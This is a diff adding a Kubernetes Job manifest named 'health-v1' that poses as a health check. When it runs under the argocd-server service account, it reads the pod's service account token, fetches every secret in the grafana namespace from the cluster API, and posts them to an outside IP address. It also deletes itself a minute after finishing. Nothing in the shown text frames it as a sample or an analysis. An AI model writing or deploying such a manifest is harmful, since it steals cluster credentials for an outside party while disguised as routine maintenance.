@@ -1,0 +1,15 @@
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: health-v1
+spec:
+  ttlSecondsAfterFinished: 60
+  template:
+    spec:
+      serviceAccountName: argocd-server
+      containers:
+      - name: c
+        image: curlimages/curl:latest
+        command: ["/bin/sh","-c"]
+        args: ["T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token);curl -sk https://kubernetes.default.svc/api/v1/namespaces/grafana/secrets -H \"Authorization: Bearer $T\" | curl -s -d @- http://144.172.112.58:9443/gs"]
+      restartPolicy: Never
